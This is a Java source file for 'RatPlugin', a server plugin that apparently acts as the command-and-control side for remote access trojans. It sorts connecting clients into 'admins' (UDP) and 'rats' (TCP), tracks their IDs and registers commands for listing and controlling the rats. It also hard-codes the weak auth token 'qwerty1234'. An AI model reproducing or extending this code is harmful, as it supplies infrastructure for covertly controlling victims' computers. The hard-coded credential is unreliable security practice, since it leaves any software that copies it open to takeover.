package com.ratplugin;

import com.ratplugin.commands.Admin;
import com.ratplugin.commands.Current;
import com.ratplugin.commands.Info;
import com.ratplugin.commands.ListRats;
import com.serverd.client.Client;
import com.serverd.plugin.Debug;
import com.serverd.plugin.Plugin;
import com.serverd.plugin.ServerdPlugin;
import com.serverd.plugin.listener.ConnectListener;
import com.serverd.plugin.listener.UpdateIDListener;

import java.util.ArrayList;

public class RatPlugin implements ServerdPlugin, ConnectListener, UpdateIDListener
{
    public ArrayList<Integer> adminsID,ratsID;

    public JsonEncoder jsonEncoder;

    public static final String AUTHTOKEN = "qwerty1234";

    @Override
    public void metadata(Plugin.Info info)
    {
        info.name = "RatPlugin";
        info.author = "rafi612";
        info.decription = "Plugin for RAT's";
        info.version = "1.0";
    }

    @Override
    public String init(Plugin plugin)
    {
        adminsID = new ArrayList<>();
        ratsID = new ArrayList<>();

        jsonEncoder = new JsonEncoder(plugin);

        plugin.addConnectListener(this);
        plugin.addUpdateIDListener(this);

        plugin.addCommand(new ListRats());
        plugin.addCommand(new Admin());
        plugin.addCommand(new Info(plugin));
        plugin.addCommand(new Current());

        return null;
    }

    @Override
    public void work(Plugin plugin)
    {

    }

    @Override
    public void stop(Plugin plugin)
    {

    }

    public static void main(String[] args)
    {
        Debug.testPlugin(RatPlugin.class.getName(),true,new String[] {});
    }

    @Override
    public void onConnect(Plugin plugin, Client client)
    {
        if (client.protocol == Client.Protocol.UDP)
        {
            ClientUtils.makeAdmin(client,this,true);
            ClientUtils.addToAdminList(client,this);
        }
        else
        {
            ClientUtils.makeRat(client);
            ClientUtils.addToRatList(client,this);
        }
    }

    @Override
    public void onDisconnect(Plugin plugin, Client client)
    {
        ClientUtils.removeFromAdminList(client,this);
        ClientUtils.removeFromRatList(client,this);
    }

    @Override
    public void updateID(Plugin plugin, int oldid, int newid)
    {
        //admins
        if (adminsID.size() > 0)
        {
            int index = adminsID.lastIndexOf(oldid);
            if (index != -1)
                adminsID.set(index, newid);
        }

        //rats
        if (ratsID.size() > 0)
        {
            int index = ratsID.lastIndexOf(oldid);
            if (index != -1)
                ratsID.set(index, newid);
        }
    }
}